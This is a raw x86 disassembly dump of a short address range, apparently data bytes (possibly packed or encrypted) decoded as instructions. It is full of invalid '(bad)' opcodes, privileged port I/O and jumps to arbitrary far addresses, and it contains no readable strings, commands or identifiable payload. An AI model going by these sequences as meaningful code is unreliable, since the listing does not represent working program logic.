  427c5f:	repnz cmp BYTE PTR [ebx+0x6389e159],cl
  427c66:	je     0x427c9e
  427c68:	inc    ecx
  427c69:	or     al,0x3d
  427c6b:	scas   eax,DWORD PTR es:[edi]
  427c6c:	aas    
  427c6d:	test   DWORD PTR [eax+0x31216170],edx
  427c73:	les    ecx,FWORD PTR [esi-0x2b65db2e]
  427c79:	pop    edi
  427c7a:	xor    bh,BYTE PTR [edx-0x1e]
  427c7d:	(bad)
  427c80:	jmp    0xd23c2aa0
  427c85:	and    dh,bl
  427c87:	retf   0xeb00
  427c8a:	inc    eax
  427c8b:	add    ebx,DWORD PTR [esi+0x47b7fa92]
  427c91:	in     eax,dx
  427c92:	cmp    al,0x35
  427c94:	stos   BYTE PTR es:[edi],al
  427c95:	cmp    bh,BYTE PTR [ecx]
  427c97:	push   ecx
  427c98:	and    dh,BYTE PTR [eax+0x6c]
  427c9b:	jg     0x427ceb
  427c9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c9e:	mov    ds:0xe82928a7,al
  427ca3:	jecxz  0x427c42
  427ca5:	das    
  427ca6:	lods   al,BYTE PTR ds:[esi]
  427ca7:	pop    ecx
  427ca8:	xor    dl,BYTE PTR [bp+si+0xca0]
  427cad:	dec    eax
  427cae:	sbb    esp,DWORD PTR [esi]
  427cb0:	push   ds
  427cb1:	mov    ?,WORD PTR [ebx+0x347aec5b]
  427cb7:	xchg   ebx,eax
  427cb8:	xchg   ebp,eax
  427cb9:	inc    edx
  427cba:	pop    esp
  427cbb:	(bad)  
  427cbc:	jne    0x427cfd
  427cbe:	push   0xed9d
	...
  427d33:	add    BYTE PTR [edx],cl
  427d35:	mov    cl,0x61
  427d37:	repz sti 
  427d39:	repz call 0x2aa1:0xdc63ecf9
  427d41:	call   0xa721240c
  427d46:	add    DWORD PTR [eax],eax
  427d48:	cmc    
  427d49:	add    BYTE PTR [eax],al
  427d4b:	add    al,dh
  427d4d:	pop    esi
  427d4e:	retf   
  427d4f:	das    
  427d50:	scas   eax,DWORD PTR es:[edi]
  427d51:	add    ch,al
  427d53:	ds aad 0x46
  427d56:	or     al,0x23
  427d58:	scas   al,BYTE PTR es:[edi]
  427d59:	sbb    BYTE PTR [ebp-0x1fcd706d],bh
  427d5f:	sub    BYTE PTR [ebp+ebx*8+0x1109845f],bh
  427d66:	and    al,0x51
  427d68:	(bad)  
  427d69:	jnp    0x427d9b
  427d6b:	aad    0xea
  427d6d:	call   0xd097:0xaf6e7a6e
  427d74:	test   BYTE PTR [ebp-0x6eb5c72],ah
  427d7a:	cwde   
  427d7b:	cwde   
  427d7c:	xor    al,0x49
  427d7e:	mov    ds:0x4add5177,eax
  427d83:	ror    dl,cl
  427d85:	dec    edx
  427d86:	in     al,0x40
  427d88:	jge    0x427dd9
  427d8a:	das    
  427d8b:	arpl   WORD PTR [edx+0x7d3cd89f],dx
  427d91:	sahf   
  427d92:	pop    esi
  427d93:	(bad)  
  427d94:	addr16 push eax
  427d96:	sub    eax,edx
  427d98:	add    BYTE PTR [eax+edx*1],cl
  427d9b:	retf   0x9abd
  427d9e:	xchg   ecx,eax
  427d9f:	scas   eax,DWORD PTR es:[edi]
  427da0:	jns    0x427dd3
  427da2:	push   edx
  427da3:	inc    esp
  427da4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427da5:	inc    eax
  427da6:	pop    ss
  427da7:	int3   
  427da8:	sub    al,0xb0
  427daa:	sbb    BYTE PTR [eax+eax*2-0x6c],0x6
  427daf:	jno    0x427dad
  427db1:	cmc    
  427db2:	mov    esi,0x94bcf663
  427db7:	jmp    0x8a52b07
  427dbc:	jmp    0x4a76:0x7504bd6b
  427dc3:	repnz dec DWORD PTR [ebp+0x10565fe6]
  427dca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427dcb:	aaa    
  427dcc:	xchg   ecx,eax
  427dcd:	mov    dh,0xac
  427dcf:	push   ebx
  427dd0:	neg    DWORD PTR [ebp+ebx*4+0x6c]
  427dd4:	pop    eax
  427dd5:	mul    ah
  427dd7:	ret    0x6d90
  427dda:	int3   
  427ddb:	cs in  eax,dx
  427ddd:	repnz fidiv WORD PTR ds:0x69ad9578
  427de4:	sbb    BYTE PTR [edi+0xa7dd6b8],0xe6
  427deb:	jecxz  0x427dab
  427ded:	mov    WORD PTR [edx-0x45],es
  427df0:	outs   dx,DWORD PTR ds:[esi]
  427df1:	pop    edi
  427df2:	xor    ebx,0x22
  427df5:	iret   
  427df6:	sbb    eax,0x2aa1b377
  427dfb:	popf   
  427dfc:	imul   esi,DWORD PTR [edi+0x66],0x1b
  427e00:	add    bl,0xa0
  427e03:	scas   al,BYTE PTR es:[edi]
  427e04:	outs   dx,DWORD PTR ds:[esi]
  427e05:	popf   
  427e06:	sbb    eax,0xee7845d4
  427e0b:	pop    ds
  427e0c:	pop    es
  427e0d:	(bad)  
  427e0e:	mov    ah,BYTE PTR [esi]
  427e10:	mov    ebp,0x1fa33a3d
  427e15:	stos   BYTE PTR es:[edi],al
  427e16:	sbb    DWORD PTR [ecx-0x6a791fb4],esi
  427e1c:	push   ebx
  427e1d:	cwde   
  427e1e:	jbe    0x427e29
  427e20:	add    eax,0xbc6e9398
  427e25:	iret   
  427e26:	ss dec esi
  427e28:	fld    DWORD PTR [eax+0x549123a5]
  427e2e:	add    eax,DWORD PTR [edx+0xb]
  427e31:	lods   eax,DWORD PTR ds:[esi]
  427e32:	cmp    ebx,DWORD PTR [ebx]
  427e34:	dec    ecx
  427e35:	and    esi,edx
  427e37:	sub    edx,DWORD PTR [eax]
  427e39:	loop   0x427e85
  427e3b:	xor    bh,BYTE PTR [esi+0x16d1bac5]
	...
  427eb1:	add    BYTE PTR [eax],al
  427eb3:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  427eba:	mov    dh,0xf7
  427ebc:	mov    ebx,esi
  427ebe:	cmp    ebx,edx
  427ec0:	nop
  427ec1:	test   eax,0xa7d35bbc
  427ec6:	add    DWORD PTR [eax],eax
  427ec8:	cmc    
  427ec9:	add    BYTE PTR [eax],al
  427ecb:	add    BYTE PTR [edi+0x28],ch
  427ece:	sub    BYTE PTR [ebx+0x54],bh
  427ed1:	das    
  427ed2:	rcl    edx,cl
  427ed4:	mov    ebx,0x52232a37
  427ed9:	lock data16 jle 0x427ec2
  427edd:	jmp    0x427f38
  427edf:	or     cx,WORD PTR [eax+0xc0bb90e]
  427ee6:	aas    
  427ee7:	cld    
  427ee8:	cmp    DWORD PTR [ecx-0x3a],esp
  427eeb:	popa   
  427eec:	sbb    al,0x7f
  427eee:	jmp    0x3a8:0x841d2710
  427ef5:	(bad)
  427ef8:	jnp    0x427f60
  427efa:	adc    eax,0xa1f3da6a
  427eff:	int3   
  427f00:	mov    DWORD PTR [ecx-0x11],0x1714efd
  427f07:	pop    ebp
  427f08:	inc    edi
  427f09:	sbb    edx,ebp
  427f0b:	mov    DWORD PTR [ebx-0x37c2f4d9],0x575a9ce8
  427f15:	outs   dx,BYTE PTR fs:[esi]
  427f17:	gs push esp
  427f19:	dec    edi
  427f1a:	xchg   ebp,ebp
  427f1c:	jle    0x427ebd
  427f1e:	ins    DWORD PTR es:[edi],dx
  427f1f:	cmp    edx,0xb15284e3
  427f25:	sub    BYTE PTR [edx-0x43f734e0],ah
  427f2b:	pop    ecx
  427f2c:	add    BYTE PTR [edx-0x33],bl
  427f2f:	cmp    ebx,DWORD PTR [edx]
  427f31:	mov    ebx,0x34c9254c
  427f36:	cmp    esp,DWORD PTR [ecx+0x61]
  427f39:	(bad)  [eax]
  427f3b:	sub    BYTE PTR [edx+0x57],bh
  427f3e:	repz shld DWORD PTR [edx-0x67f0f794],edx,cl
  427f46:	ror    DWORD PTR [ebx],0xd4
  427f49:	clc    
  427f4a:	pop    es
  427f4b:	mov    al,ds:0xc87cdd48
  427f50:	(bad)  
  427f51:	mov    DWORD PTR [edx],edi
  427f53:	and    eax,0xc932dd1a
  427f58:	ficomp WORD PTR [esi-0x650a7dbb]
  427f5e:	jg     0x427fcc
  427f60:	jb     0x427fdd
  427f62:	mov    edi,cs
  427f64:	idiv   DWORD PTR [ecx-0x2a]
  427f67:	arpl   WORD PTR [esi+0x6e5c549a],dx
  427f6d:	mov    esp,0xd00dca86
  427f72:	dec    eax
  427f73:	(bad)  
  427f74:	retf   0x1212
  427f77:	mov    gs,WORD PTR [ebx+0x8]
  427f7a:	or     al,0xa8
  427f7c:	add    BYTE PTR ds:0xd1fc65b3,0x2d
  427f83:	and    edx,DWORD PTR [ebx+0x40]
  427f86:	ss jo  0x427f60
  427f89:	jno    0x427f55
  427f8b:	sahf   
  427f8c:	mov    gs,ebx
  427f8e:	dec    ebp
  427f8f:	xor    cl,bl
  427f91:	sub    ebx,DWORD PTR ds:0x173ca7de
  427f97:	scas   al,BYTE PTR es:[edi]
  427f98:	adc    ebp,DWORD PTR [eax+0x287e0882]
  427f9e:	xchg   edi,eax
  427f9f:	jo     0x427fe8
  427fa1:	xor    ebp,DWORD PTR [ebx-0x26d1c2f0]
  427fa7:	mov    bl,bl
  427fa9:	cmp    BYTE PTR [esi],dl
  427fab:	lods   eax,DWORD PTR ds:[esi]
  427fac:	sub    BYTE PTR [esi+ebx*1+0x5b],0x39
  427fb1:	fdivr  QWORD PTR [eax]
  427fb3:	aam    0xa2
  427fb5:	out    dx,al
  427fb6:	int3   
  427fb7:	cwde   
  427fb8:	in     al,dx
  427fb9:	mov    al,ds:0xb7c2a6e1
  427fbe:	pop    esp
  427fbf:	ror    DWORD PTR [ecx+0x0],1
	...
  428032:	add    BYTE PTR [eax],al
  428034:	or     al,0x6d
  428036:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42803c:	mov    DWORD PTR [ebx+0x5a],edx
  42803f:	xchg   DWORD PTR [ebx+0x6c],ecx
  428042:	xor    eax,0x1a8c8f9
  428047:	add    ch,dh
  428049:	add    BYTE PTR [eax],al
  42804b:	add    BYTE PTR [esi],dl
  42804d:	mov    bh,0xf3
  42804f:	jecxz  0x427fda
  428051:	xchg   BYTE PTR [ecx+0x3],al
  428054:	icebp  
  428055:	cwde   
  428056:	push   0x958b6c29
  42805b:	mov    ds:0x1f3a0184,al
  428060:	xchg   esi,eax
  428061:	and    al,0x28
  428063:	mov    dl,BYTE PTR [edi+0x37]
  428066:	dec    edi
  428067:	(bad)
  42806a:	mov    cl,0xc2
  42806c:	xor    ah,BYTE PTR [ebp+0x3d]
  42806f:	mov    dl,0xf7
  428071:	lods   eax,DWORD PTR ds:[esi]
  428072:	outs   dx,BYTE PTR ds:[esi]
  428073:	mov    edx,0xa5c4bc77
  428078:	mov    ebp,DWORD PTR [edi+0x23b92424]
  42807e:	dec    eax
  42807f:	lods   eax,DWORD PTR ds:[esi]
  428080:	mov    ecx,0x513a1256
  428085:	sub    esp,DWORD PTR [ecx-0x1a0b1d5f]
  42808b:	push   eax
  42808c:	test   al,0xbd
  42808e:	xchg   esi,eax
  42808f:	dec    eax
  428090:	shr    DWORD PTR [esi+0x79],cl
  428093:	loopne 0x4280f4
  428095:	xlat   BYTE PTR ds:[ebx]
  428096:	dec    edi
  428097:	adc    edx,esi
  428099:	dec    ebx
  42809a:	(bad)  
  42809b:	sbb    DWORD PTR [esp+ebx*4+0x1977c453],edi
  4280a2:	pop    edx
  4280a3:	(bad)  
  4280a4:	jno    0x42809d
  4280a6:	sub    DWORD PTR [ebx-0x609043a2],ebx
  4280ac:	jmp    0xec1320e5
  4280b1:	js     0x4280f0
  4280b3:	loop   0x42812e
  4280b5:	aam    0xcc
  4280b7:	out    dx,al
  4280b8:	in     eax,dx
  4280b9:	push   cs
  4280ba:	pop    edx
  4280bb:	aaa    
  4280bc:	jns    0x428096
  4280be:	sub    BYTE PTR [ebx+0x3f807256],dh
  4280c4:	mov    ecx,0x96bff0e7
  4280c9:	test   eax,0xfc1af17e
  4280ce:	xchg   BYTE PTR [esp+eax*8-0x63],dh
  4280d2:	in     eax,0x27
  4280d4:	das    
  4280d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4280d6:	xchg   ebp,eax
  4280d7:	adc    al,0xcc
  4280d9:	jle    0x4280d5
  4280db:	jno    0x4280e2
  4280dd:	lahf   
  4280de:	add    BYTE PTR [ebx+edi*1-0x27f79de8],ch
  4280e5:	or     DWORD PTR [eax],ebx
  4280e7:	add    al,0x17
  4280e9:	call   FWORD PTR es:[ecx-0x923b1fa]
  4280f0:	inc    ebp
  4280f1:	inc    ebp
  4280f2:	jno    0x4280ef
  4280f4:	inc    ecx
  4280f5:	test   DWORD PTR [ebx+0x19],esp
  4280f8:	mov    ds:0xd0b4ac51,eax
  4280fd:	or     bl,BYTE PTR [edi-0x703e179c]
  428103:	cmp    al,0xb6
  428105:	out    dx,eax
  428106:	push   ebx
  428107:	(bad)  
  428108:	imul   esi,DWORD PTR [ebp-0x2481e449],0xd5176bbf
  428112:	aas    
  428113:	bound  esi,QWORD PTR [edx-0x3c]
  428116:	xchg   DWORD PTR [edx-0x3],ebp
  428119:	push   0xe69fff96
  42811e:	inc    ebp
  42811f:	mov    al,0x24
  428121:	cmp    esi,DWORD PTR [eax-0x804b3f6]
  428127:	mov    bl,cl
  428129:	xor    DWORD PTR [ebx-0x3c],ecx
  42812c:	daa    
  42812d:	pop    esp
  42812e:	repz shl BYTE PTR [esi+0x6c],1
  428132:	(bad)  [eax]
  428134:	push   ds
  428135:	mov    dl,0xd0
  428137:	out    dx,eax
  428138:	in     al,0xa5
  42813a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42813b:	xchg   ebx,eax
  42813c:	push   cs
  42813d:	jne    0x42812d
  42813f:	jp     0x4281ac
	...
  4281b1:	add    BYTE PTR [eax],al
  4281b3:	add    BYTE PTR [esi],bl
  4281b5:	inc    ecx
  4281b6:	fdiv   QWORD PTR [edi+ebx*8+0x79eb7ebd]
  4281bd:	stos   BYTE PTR es:[edi],al
  4281be:	push   0xda1abf4f
  4281c3:	cld    
  4281c4:	mov    ebp,0xf50001a9
  4281c9:	add    BYTE PTR [eax],al
  4281cb:	add    BYTE PTR [esi-0x6d9684a7],dl
  4281d1:	add    DWORD PTR [eax],esi
  4281d3:	pop    es
  4281d4:	icebp  
  4281d5:	mov    bl,0x39
  4281d7:	aad    0xb3
  4281d9:	sti    
  4281da:	fwait
  4281db:	pop    esi
  4281dc:	rcl    BYTE PTR [esi],cl
  4281de:	push   0x44
  4281e0:	(bad)  
  4281e1:	xchg   ecx,eax
  4281e2:	push   ss
  4281e3:	mov    cl,0xfa
  4281e5:	push   ss
  4281e6:	jne    0x4281e0
  4281e8:	sub    al,0x8f
  4281ea:	in     al,dx
  4281eb:	push   eax
  4281ec:	mov    bh,0x82
  4281ee:	std    
  4281ef:	ins    BYTE PTR es:[edi],dx
  4281f0:	fsub   DWORD PTR [ecx+ebx*2-0x1b]
  4281f4:	sub    edi,DWORD PTR [di]
  4281f7:	idiv   bh
  4281f9:	and    DWORD PTR [esi+0x3405bb87],esi
  4281ff:	pop    ds
  428200:	rcr    ch,cl
  428202:	jne    0x428250
  428204:	les    eax,FWORD PTR [esi]
  428206:	aaa    
  428207:	and    dl,ah
  428209:	fld    QWORD PTR [eax*2+0x58e3c254]
  428210:	cmp    DWORD PTR [edx+eiz*2-0x20deba79],edi
  428217:	stos   DWORD PTR es:[edi],eax
  428218:	adc    ebp,DWORD PTR [edi]
  42821a:	loopne 0x4281bb
  42821c:	pushf  
  42821d:	push   esp
  42821e:	ret    0x699b
  428221:	cwde   
  428222:	shl    DWORD PTR [edi+0x62],0x7
  428226:	mov    al,ds:0x74d24d08
  42822b:	(bad)  
  42822c:	in     eax,dx
  42822d:	xor    eax,0xf5e3f6e7
  428232:	sub    eax,0x9bfbc8f4
  428237:	xchg   DWORD PTR [eax+eax*8],eax
  42823a:	mov    cl,0x50
  42823c:	add    al,0xe2
  42823e:	sub    BYTE PTR [ebp+0x73],dl
  428241:	and    ebp,ebx
  428243:	sub    eax,0x533c991c
  428248:	lods   eax,DWORD PTR ds:[esi]
  428249:	add    BYTE PTR [edi+edi*8-0x61039ecd],0x6c
  428251:	rcr    BYTE PTR [ebx-0x30],0xc0
  428255:	mov    ds:0x2ee718f4,al
  42825a:	mov    al,ds:0x3283f674
  42825f:	push   0xffffffeb
  428261:	mov    ds:0x95981eb6,eax
  428266:	outs   dx,BYTE PTR ds:[esi]
  428267:	sahf   
  428268:	stos   BYTE PTR es:[edi],al
  428269:	add    al,0x71
  42826b:	sbb    dl,ch
  42826d:	shr    DWORD PTR [ecx],0x15
  428270:	fwait
  428271:	int    0x67
  428273:	xlat   BYTE PTR ds:[ebx]
  428274:	hlt    
  428275:	outs   dx,DWORD PTR ds:[esi]
  428276:	shr    BYTE PTR [ecx-0x61],cl
  428279:	sub    BYTE PTR ds:0x487150ef,ah
  42827f:	enter  0x503a,0x77
  428283:	push   ss
  428284:	jnp    0x4282ae
  428286:	ins    DWORD PTR es:[edi],dx
  428287:	sbb    DWORD PTR gs:[esi+0x40],esp
  42828b:	rol    cl,1
  42828d:	pop    es
  42828e:	into   
  42828f:	loopne 0x42824c
  428291:	xor    bx,WORD PTR [ecx-0x21]
  428295:	addr16 daa 
  428297:	cdq    
  428298:	loope  0x42824d
  42829a:	ja     0x42821f
  42829c:	(bad)  
  42829d:	repnz pop ecx
  42829f:	jl     0x42826f
  4282a1:	xchg   DWORD PTR [eax-0x27],esp
  4282a4:	xchg   ebx,eax
  4282a5:	ret    
  4282a6:	out    0x86,al
  4282a8:	dec    ecx
  4282a9:	clc    
  4282aa:	push   edx
  4282ab:	nop
  4282ac:	xchg   ebp,eax
  4282ad:	icebp  
  4282ae:	mov    bl,0xb9
  4282b0:	adc    dh,BYTE PTR [edx-0x75]
  4282b3:	mov    ecx,0x3e0233a3
  4282b8:	cli    
  4282b9:	addr16 push 0xffffffa0
  4282bc:	jg     0x428303
  4282be:	mov    eax,ds:0x6b25
	...
  428333:	add    BYTE PTR [edx],dl
  428335:	sbb    eax,0xaf3f8832
  42833a:	mov    edx,0x671fe09f
  42833f:	pusha  
  428340:	and    BYTE PTR [eax+0x23],cl
  428343:	lea    esi,[edx-0xafffe56]
  428349:	add    BYTE PTR [eax],al
  42834b:	add    BYTE PTR [esi+0x2a20a1f5],bl
  428351:	aas    
  428352:	(bad)  
  428353:	pop    esi
  428354:	das    
  428355:	icebp  
  428356:	ins    BYTE PTR es:[edi],dx
  428357:	iret   
  428358:	adc    BYTE PTR [edi+0x48a01f4b],cl
  42835e:	xchg   ebp,eax
  42835f:	rcl    esp,1
  428361:	cmp    ecx,DWORD PTR [ebp-0x564b6a07]
  428367:	mov    esi,0x1af8289
  42836c:	jb     0x42832c
  42836e:	lock in al,0x57
  428371:	out    dx,al
  428372:	adc    dl,BYTE PTR [eax+0x41]
  428375:	push   ebx
  428376:	mov    edi,0x7c2db061
  42837b:	out    dx,al
  42837c:	cdq    
  42837d:	xor    ebp,ebp
  42837f:	push   ds
  428380:	pop    es
  428381:	mov    bh,BYTE PTR [ebx]
  428383:	retf   0x55b4
  428386:	sub    eax,ebx
  428388:	jl     0x4283f3
  42838a:	retf   
  42838b:	lds    edi,FWORD PTR [edx-0x22ba816]
  428391:	gs ret 0xc48c
  428395:	push   eax
  428396:	addr16 retf 
  428398:	pop    ds
  428399:	mov    DWORD PTR [edi+ebp*4-0x16ee3447],ecx
  4283a0:	retf   
  4283a1:	ds popa 
  4283a3:	mov    dh,dh
  4283a5:	lods   eax,DWORD PTR ds:[esi]
  4283a6:	cdq    
  4283a7:	dec    DWORD PTR [ebx-0x65]
  4283aa:	out    0x5b,al
  4283ac:	call   0xb694:0xb41b4174
  4283b3:	inc    eax
  4283b4:	adc    al,0x8b
  4283b6:	mov    ecx,DWORD PTR [edi+esi*1]
  4283b9:	(bad)  
  4283ba:	pop    ebx
  4283bb:	cmp    BYTE PTR [eax+0x76],cl
  4283be:	ss jns 0x428409
  4283c1:	sub    al,0xe1
  4283c3:	test   eax,0xa2d3eabd
  4283c8:	jp     0x4283b7
  4283ca:	sub    esp,ecx
  4283cc:	add    DWORD PTR [ecx+0x40af3cd7],edi
  4283d2:	xchg   esp,eax
  4283d3:	cmp    ebp,eax
  4283d5:	add    BYTE PTR [eax+0x48],0x9a
  4283d9:	mov    bh,0x98
  4283db:	mov    ds:0xfe5d8031,al
  4283e0:	test   al,0x46
  4283e2:	cmp    eax,0x59cad647
  4283e7:	dec    ebp
  4283e8:	jmp    0x64ab:0x88d7f982
  4283ef:	mov    ds:0x3f3fe5b3,al
  4283f4:	into   
  4283f5:	lds    ebp,FWORD PTR [edx+edx*1]
  4283f8:	mov    cl,0x5d
  4283fa:	into   
  4283fb:	pushf  
  4283fc:	mov    ebp,0xa5b29621
  428401:	inc    esp
  428402:	xchg   edi,eax
  428403:	or     ah,ah
  428405:	sbb    BYTE PTR [ecx],bh
  428407:	sub    BYTE PTR [ecx+0x5b41a4cc],bl
  42840d:	jnp    0x4283f3
  42840f:	mov    esp,0x8b2d2d42
  428414:	out    0xc9,al
  428416:	adc    ah,BYTE PTR [ecx-0x165ed3dc]
  42841c:	mov    ebx,0xda9c3bc9
  428421:	and    eax,0x399266ab
  428426:	sub    eax,0x9a320574
  42842b:	sub    eax,0xad167920
  428430:	mov    ds:0xa093a24c,al
  428435:	cwde   
  428436:	cmp    DWORD PTR [ecx-0x7b106a2],ebx
  42843c:	inc    esi
  42843d:	ds push 0x75
  428440:	fadd   DWORD PTR [eax]
	...
  4284b2:	add    BYTE PTR [eax],al
  4284b4:	pop    esp
  4284b5:	test   al,0xc0
  4284b7:	stos   DWORD PTR es:[edi],eax
  4284b8:	hlt    
  4284b9:	jmp    0x42853a
  4284bb:	jmp    FWORD PTR [ecx-0x2194cbf9]
  4284c1:	(bad)  
  4284c2:	mov    ebp,0x1aba7bd
  4284c7:	add    ch,dh
  4284c9:	add    BYTE PTR [eax],al
  4284cb:	add    BYTE PTR [ebx-0x7c6c2839],dh
  4284d1:	cwde   
  4284d2:	cmp    cl,bl
  4284d4:	call   0x2a3f:0xf7e49737
  4284db:	push   ss
  4284dc:	out    0xec,al
  4284de:	cs push di
  4284e1:	lahf   
  4284e2:	xchg   ebp,eax
  4284e3:	add    edi,ecx
  4284e5:	dec    ecx
  4284e6:	(bad)  
  4284e8:	shr    DWORD PTR [edx],cl
  4284ea:	fnsave [edi-0x39]
  4284ed:	sub    edx,DWORD PTR [ebx]
  4284ef:	inc    esi
  4284f0:	ins    BYTE PTR es:[edi],dx
  4284f1:	mov    al,BYTE PTR [edi-0x5d1553d5]
  4284f7:	push   0xe3c05e39
  4284fc:	mov    edi,0x36f5f2ab
  428501:	adc    DWORD PTR [edi-0x53],ecx
  428504:	sub    ebp,DWORD PTR [edi-0x7284489f]
  42850a:	push   eax
  42850b:	cmp    eax,0xb4756a0d
  428510:	mov    eax,0xeb6a9ab7
  428515:	and    DWORD PTR [ecx+eiz*2-0x2c],edi
  428519:	mov    al,ds:0x14fd70a6
  42851e:	lea    ebp,[edx]
  428520:	pop    ebx
  428521:	mov    ?,WORD PTR [ebp-0x3519d559]
  428527:	(bad)  
  428528:	sbb    al,0xa5
  42852a:	stc    
  42852b:	je     0x42854f
  42852d:	mov    ebx,0x4a3e076f
  428532:	mov    ds:0xd34b33b6,al
  428537:	mov    edi,0xa903775
  42853c:	(bad)  
  42853d:	jl     0x428536
  42853f:	mov    cl,BYTE PTR [esi-0x448f714e]
  428545:	aas    
  428546:	pushf  
  428547:	push   edx
  428548:	pusha  
  428549:	popa   
  42854a:	loop   0x428552
  42854c:	loopne 0x428551
  42854e:	mov    bl,0x61
  428550:	sub    BYTE PTR [esi],dl
  428552:	xor    al,bl
  428554:	aad    0xd1
  428556:	inc    esi
  428557:	mov    fs,edi
  428559:	(bad)  
  42855b:	push   ds
  42855c:	pop    esi
  42855d:	cmp    al,0xd8
  42855f:	jb     0x4285d8
  428561:	xchg   DWORD PTR [eax-0x52],ebx
  428564:	xor    BYTE PTR [eax+ebp*8+0x376cfafb],dl
  42856b:	xchg   DWORD PTR [edi+0x4a],eax
  42856e:	pop    ebx
  42856f:	sub    eax,0xa7c7bfee
  428574:	sbb    cl,BYTE PTR [edi+edi*4+0x23]
  428578:	out    0x3d,eax
  42857a:	inc    edi
  42857b:	pushf  
  42857c:	jge    0x428522
  42857e:	xor    al,0x18
  428580:	mov    ebp,0x45308c0f
  428585:	into   
  428586:	icebp  
  428587:	daa    
  428588:	ret    
  428589:	cwde   
  42858a:	fs cli 
  42858c:	mov    eax,ds:0x29a5b44d
  428591:	jmp    0xa4b9:0xf80c48f
  428598:	or     edx,DWORD PTR ds:0x227c0419
  42859e:	gs js  0x428529
  4285a1:	arpl   WORD PTR [eax+esi*4+0x2d],dx
  4285a5:	shr    DWORD PTR [ecx-0xe],1
  4285a8:	add    al,0xcc
  4285aa:	retf   
  4285ab:	sub    eax,0xbd07cd06
  4285b0:	push   ds
  4285b1:	mov    edi,fs
  4285b3:	icebp  
  4285b4:	and    bl,ah
  4285b6:	cmp    eax,0x298c3761
  4285bb:	push   ecx
  4285bc:	cli    
  4285bd:	push   ebx
  4285be:	hlt    
  4285bf:	retf   
  4285c0:	adc    al,BYTE PTR [eax]
	...
  428632:	add    BYTE PTR [eax],al
  428634:	add    DWORD PTR [esi-0x70],edx
  428637:	out    dx,al
  428638:	xlat   BYTE PTR ds:[ebx]
  428639:	out    dx,al
  42863a:	jg     0x42863b
  42863c:	(bad)  
  42863d:	dec    esi
  42863e:	cmp    al,0xb7
  428640:	pop    ebx
  428641:	dec    edi
  428642:	cmp    dl,BYTE PTR [ecx]
  428644:	pushf  
  428645:	lods   al,BYTE PTR ds:[esi]
  428646:	add    DWORD PTR [eax],eax
  428648:	cmc    
  428649:	add    BYTE PTR [eax],al
  42864b:	add    BYTE PTR [ecx-0xb5122c5],dl
  428651:	jge    0x428659
  428653:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428654:	daa    
  428655:	sbb    BYTE PTR [edx],dl
  428657:	nop
  428658:	fistp  QWORD PTR [ebp-0x5]
  42865b:	scas   eax,DWORD PTR es:[edi]
  42865c:	lods   eax,DWORD PTR ds:[esi]
  42865d:	inc    eax
  42865e:	cld    
  42865f:	aad    0xae
  428661:	std    
  428662:	stos   BYTE PTR es:[edi],al
  428663:	retf   0x5db9
  428666:	in     al,0xf
  428668:	(bad)  
  428669:	test   DWORD PTR [edx+ecx*1],ebp
  42866c:	sub    eax,0xa53d7c8
  428671:	mov    bl,0xd
  428673:	sbb    DWORD PTR [ebx-0x76],0xe37a3f
  42867a:	call   0xf46617fd
  42867f:	cwde   
  428680:	out    0xe7,al
  428682:	add    bh,BYTE PTR [edx-0x40]
  428685:	hlt    
  428686:	hlt    
  428687:	mov    al,0xd8
  428689:	jecxz  0x428662
  42868b:	adc    ebx,DWORD PTR [edi]
  42868d:	inc    edx
  42868e:	icebp  
  42868f:	mov    ds:0xf253f37f,eax
  428694:	mov    eax,0xa17e78a7
  428699:	xlat   BYTE PTR ds:[ebx]
  42869a:	and    esi,0xffffff85
  42869d:	fimul  WORD PTR [edi+edi*4-0x5a]
  4286a1:	ss inc esi
  4286a3:	add    DWORD PTR [esi],ebx
  4286a5:	fist   DWORD PTR [ecx]
  4286a7:	nop
  4286a8:	adc    eax,0x507f70d4
  4286ad:	pop    ecx
  4286ae:	sub    al,0xfe
  4286b0:	in     eax,0x78
  4286b2:	fld    TBYTE PTR [edi]
  4286b4:	jg     0x428663
  4286b6:	xor    al,0xa9
  4286b8:	mov    ch,0x22
  4286ba:	dec    ebx
  4286bb:	loopne 0x4286e0
  4286bd:	fimul  DWORD PTR [ebx]
  4286bf:	mov    WORD PTR [ebp+0x592b768d],ss
  4286c5:	sbb    ebx,edi
  4286c7:	or     al,0xa0
  4286c9:	pop    esi
  4286ca:	arpl   si,cx
  4286cc:	daa    
  4286cd:	jp     0x4286d4
  4286cf:	repz mov ds,WORD PTR [ebp+0x7b7ad4fa]
  4286d6:	fcomp  QWORD PTR [edx+ebx*4+0x633ebad7]
  4286dd:	mov    cl,0xe7
  4286df:	sub    eax,0x67cdc1a3
  4286e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4286e5:	push   eax
  4286e6:	push   ebp
  4286e7:	mov    ebx,0xc66e247a
  4286ec:	inc    ebx
  4286ed:	scas   al,BYTE PTR es:[edi]
  4286ee:	adc    BYTE PTR [ecx+0x2b522bd7],cl
  4286f4:	idiv   DWORD PTR [ebx+ebx*8+0x75]
  4286f8:	xlat   BYTE PTR ds:[ebx]
  4286f9:	andps  xmm1,XMMWORD PTR [esi]
  4286fc:	xlat   BYTE PTR ds:[ebx]
  4286fd:	dec    ebx
  4286fe:	adc    DWORD PTR [eax],esp
  428700:	frstor fs:[edi+0x147c991e]
  428707:	xchg   esi,eax
  428708:	sar    DWORD PTR [edi+ebx*4-0x4d],cl
  42870c:	mov    ah,0xdb
  42870e:	inc    ebx
  42870f:	ins    BYTE PTR es:[edi],dx
  428710:	push   ebx
  428711:	mov    bh,0xe5
  428713:	ins    BYTE PTR es:[edi],dx
  428714:	jle    0x42873e
  428716:	out    dx,eax
  428717:	pusha  
  428718:	adc    dl,dh
  42871a:	push   ebp
  42871b:	shr    BYTE PTR [ebx],cl
  42871d:	les    edi,FWORD PTR [edi]
  42871f:	inc    eax
  428720:	test   DWORD PTR [esi-0x4adde2c8],eax
  428726:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428727:	iret   
  428728:	and    DWORD PTR [ecx+0x46],ecx
  42872b:	in     eax,dx
  42872c:	xchg   esi,eax
  42872d:	mov    WORD PTR [edx],gs
